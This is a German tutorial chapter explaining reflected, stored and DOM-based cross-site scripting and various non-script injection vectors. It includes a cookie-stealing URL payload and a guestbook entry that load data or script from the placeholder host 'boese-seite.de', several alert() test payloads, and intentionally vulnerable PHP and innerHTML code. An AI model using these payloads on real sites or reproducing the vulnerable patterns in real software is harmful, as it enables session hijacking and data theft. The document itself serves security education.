# Ursachen und Angriffsvektoren

### Die Wurzel des Problems: Ursachen und Angriffsvektoren von XSS

Um Cross-Site Scripting (XSS) wirklich zu verstehen und wirksam zu bekämpfen, musst du zunächst an die Wurzel des Problems vordringen. Im Kern ist XSS eine Vertrauenskrise. Dein Browser vertraut grundsätzlich dem Server, von dem er eine Webseite erhält. Er geht davon aus, dass der gelieferte Mix aus HTML, CSS und JavaScript sicher ist, und führt ihn ohne Argwohn aus. Die XSS-Schwachstelle entsteht genau in dem Moment, in dem dieses Vertrauen missbraucht wird.

#### Das Kernproblem: Wenn Daten zu Code werden

Stell dir eine Webseite mit einem Kommentarbereich vor. Ein Nutzer schreibt einen Kommentar, klickt auf „Senden“, und der Server speichert diesen Text in einer Datenbank. Ein anderer Besucher ruft die Seite auf, und der Server liest den Kommentar aus der Datenbank und fügt ihn in das HTML der Seite ein.

Was passiert, wenn der erste Nutzer statt eines netten Kommentars bösartigen JavaScript-Code hinterlässt, verpackt in einem `<script>`-Tag?

```html
<p>Ein harmloser Kommentar.</p>
<p><script>alert('Du wurdest gehackt!');</script></p>
<p>Noch ein Kommentar.</p>
```

Wenn der Server diesen Text einfach so in die Seite einfügt, sieht der Browser des nächsten Besuchers den `<script>`-Tag. Da der Browser dem Server vertraut, denkt er: „Ah, ein Skript, das soll ich wohl ausführen.“ Und genau das tut er.

Die Ursache für XSS ist also immer dieselbe: **Die unzureichende Trennung von Daten und Code.** Benutzereingaben, die eigentlich nur als reine Daten (Text, Zahlen) behandelt werden dürften, werden vom Browser des Opfers fälschlicherweise als ausführbarer Code (JavaScript, HTML) interpretiert. Der Server agiert dabei als unfreiwilliger Komplize, der die bösartigen Daten entgegennimmt und an andere Nutzer weiterreicht.

Um diese Angriffe zu verstehen, unterteilen wir sie in drei Hauptkategorien, die die gängigsten Angriffsvektoren beschreiben.

#### Reflektiertes XSS: Der schnelle Angriff über den Link

Reflektiertes XSS (engl. *Reflected XSS*) ist die wohl häufigste Form. Der bösartige Code wird dabei nicht dauerhaft auf dem Server gespeichert. Stattdessen ist er Teil der Anfrage an den Server – meist als Parameter in einer URL. Der Server nimmt diesen Parameter entgegen, verarbeitet ihn und „reflektiert“ ihn direkt in der Antwortseite zurück an den Browser.

Ein klassisches Beispiel ist eine Suchfunktion. Du gibst einen Suchbegriff in ein Feld ein, und die Ergebnisseite zeigt dir an: „Du hast nach ‚*Dein Suchbegriff*‘ gesucht.“

Stell dir eine einfache PHP-Implementierung vor:

```php
// suche.php
$suchbegriff = $_GET['q']; // Holt den Suchbegriff aus der URL
echo "Du hast nach '<strong>" . $suchbegriff . "</strong>' gesucht.";
```

Eine normale URL würde so aussehen: `https://deine-seite.de/suche.php?q=HTML`

Ein Angreifer könnte nun eine manipulierte URL erstellen und sie an ein potenzielles Opfer senden, zum Beispiel per E-Mail oder in einem Chat:

`https://deine-seite.de/suche.php?q=<script>document.location='https://boese-seite.de/steal?cookie='+document.cookie</script>`

Wenn das Opfer auf diesen Link klickt, passiert Folgendes:
1.  Der Browser sendet die Anfrage an `deine-seite.de`. Der bösartige Code ist Teil des `q`-Parameters.
2.  Der Server unter `deine-seite.de` liest den Parameter aus und baut ihn, ohne ihn zu bereinigen, in die HTML-Antwort ein.
3.  Der resultierende HTML-Code, der an den Browser des Opfers gesendet wird, sieht so aus:

```html
Du hast nach '<strong><script>document.location='https://boese-seite.de/steal?cookie='+document.cookie</script></strong>' gesucht.
```

4.  Der Browser des Opfers führt das Skript aus, stiehlt den Session-Cookie des Nutzers und leitet ihn an den Server des Angreifers weiter. Mit diesem Cookie kann der Angreifer die Sitzung des Opfers übernehmen.

Das Tückische daran ist, dass der Angriff über eine vertrauenswürdige Domain (`deine-seite.de`) läuft. Das Opfer sieht eine legitime URL und ist eher geneigt, darauf zu klicken. Der bösartige Code wird aber nie auf dem Server gespeichert, er existiert nur im Moment der Anfrage und der Antwort.

#### Gespeichertes XSS: Die tickende Zeitbombe in der Datenbank

Gespeichertes XSS (engl. *Stored XSS* oder *Persistent XSS*) gilt als die gefährlichere Variante. Hier wird der bösartige Code vom Angreifer an den Server gesendet und dort dauerhaft gespeichert – zum Beispiel in einer Datenbank, einer Log-Datei oder einer Textdatei.

Jedes Mal, wenn ein anderer Nutzer eine Seite aufruft, die diese gespeicherten Daten anzeigt, wird der bösartige Code vom Server ausgeliefert und im Browser des Opfers ausgeführt.

Typische Angriffsziele sind:
*   Kommentarfunktionen in Blogs
*   Beiträge in Foren
*   Nutzerprofile (z. B. im Feld „Über mich“)
*   Produktbewertungen
*   Chat-Nachrichten

Stell dir ein Gästebuch vor. Ein Angreifer hinterlässt folgenden Eintrag:

`Tolle Webseite! Besucht doch auch mal mein Profil. <script src="https://boese-seite.de/payload.js"></script>`

Der Server validiert diese Eingabe nicht ausreichend und speichert sie in der `kommentare`-Tabelle seiner Datenbank. Von nun an passiert Folgendes: Jeder einzelne Besucher, der das Gästebuch aufruft, erhält vom Server eine HTML-Seite, die diesen bösartigen Eintrag enthält. Der Browser jedes Besuchers lädt und führt das Skript `payload.js` vom Server des Angreifers aus.

Der Angreifer muss sein Opfer nicht mehr dazu verleiten, auf einen speziellen Link zu klicken. Er platziert seine „Bombe“ einmal und wartet dann einfach ab. Dies macht gespeichertes XSS besonders potent, da ein einziger erfolgreicher Angriff Tausende von Nutzern kompromittieren kann, einschließlich Administratoren mit erhöhten Rechten.

#### DOM-basiertes XSS: Die clientseitige Falle

DOM-basiertes XSS (engl. *DOM-based XSS*) ist die subtilste der drei Varianten. Hier liegt die Schwachstelle ausschließlich im clientseitigen Code, also im JavaScript, das im Browser läuft. Der bösartige Payload muss den Server nicht einmal zwangsläufig erreichen, um wirksam zu sein.

Die Schwachstelle entsteht, wenn JavaScript Daten aus einer vom Nutzer kontrollierbaren Quelle (z. B. der URL) liest und diese Daten unsicher in das Document Object Model (DOM) der Seite schreibt.

Ein typisches Beispiel ist JavaScript, das den Inhalt der URL nach dem `#` (dem sogenannten *Fragment Identifier* oder *Hash*) ausliest, um Teile der Seite dynamisch zu verändern. Dieser Teil der URL wird normalerweise nicht an den Server gesendet.

Betrachte folgenden JavaScript-Code auf einer Seite:

```javascript
// Dieses Skript soll den Namen des Nutzers aus der URL lesen und ihn begrüßen.
// z.B. bei https://deine-seite.de/profil#user=Anna
let userName = window.location.hash.substring(6); // Holt "Anna"
document.getElementById('welcome-message').innerHTML = "Willkommen, " + userName + "!";
```

Der Knackpunkt hier ist die Verwendung von `.innerHTML`. Diese Eigenschaft weist den Browser an, den übergebenen String als HTML zu interpretieren. Ein Angreifer kann dies ausnutzen und einen Link wie diesen erstellen:

`https://deine-seite.de/profil#user=<img src=x onerror="alert('XSS!')">`

Wenn das Opfer diesen Link aufruft:
1.  Der Browser lädt die Seite `profil` von `deine-seite.de`. Der Server sieht den Teil `#user=...` nicht.
2.  Das clientseitige JavaScript wird ausgeführt. Es liest `window.location.hash`, extrahiert den bösartigen String `<img src=x onerror="alert('XSS!')">` und schreibt ihn via `.innerHTML` in das `welcome-message`-Element.
3.  Der Browser versucht, ein Bild von der ungültigen Quelle `x` zu laden. Das schlägt fehl und löst das `onerror`-Ereignis aus, welches den bösartigen JavaScript-Code ausführt.

Der Server bleibt bei diesem Angriff völlig ahnungslos. In den Server-Logs taucht nur eine harmlose Anfrage für `/profil` auf. Die gesamte bösartige Logik spielt sich ausschließlich im Browser des Opfers ab, was die Erkennung dieser Art von XSS erschwert.

#### Mehr als nur `<script>`: Vielfältige Angriffsvektoren

Ein weit verbreiteter Irrglaube ist, dass man nur nach dem Wort `<script>` filtern müsse, um vor XSS sicher zu sein. Die Realität ist weitaus komplexer. Angreifer haben unzählige kreative Wege gefunden, um JavaScript auszuführen, oft ohne ein einziges `<script>`-Tag.

Hier sind nur einige Beispiele für HTML-Konstrukte, die für XSS missbraucht werden können:

*   **Event-Handler in fast jedem Tag:**
    ```html
    <img src="valid-image.jpg" onmouseover="alert('XSS')">
    <body onload="alert('XSS')">
    <div onclick="doSomethingMalicious()">Klick mich</div>
    ```

*   **Der `onerror`-Handler als Allzweckwaffe:**
    ```html
    <img src="gibtesnicht.jpg" onerror="alert('XSS')">
    <video src="gibtesnicht.mp4" onerror="alert('XSS')"></video>
    ```

*   **Das `href`-Attribut in Links:**
    ```html
    <a href="javascript:alert('XSS')">Harmloser Link</a>
    ```

*   **Einbettungen wie `<iframe>`, `<svg>` oder `<object>`:**
    ```html
    <iframe src="javascript:alert('XSS')"></iframe>
    <svg onload="alert('XSS')"></svg>
    ```

*   **Formular-Attribute:**
    ```html
    <form><button formaction="javascript:alert('XSS')">Senden</button></form>
    ```

Diese Vielfalt zeigt, dass ein naiver Blacklist-Ansatz, bei dem man versucht, gefährliche Tags und Attribute zu verbieten, zum Scheitern verurteilt ist. Ein Angreifer wird fast immer einen Weg finden, den Filter zu umgehen. Die eigentliche Lösung liegt darin, dem Browser klarzumachen, was Daten sind und was Code ist – ein Thema, das wir im nächsten Kapitel über Gegenmaßnahmen behandeln werden.
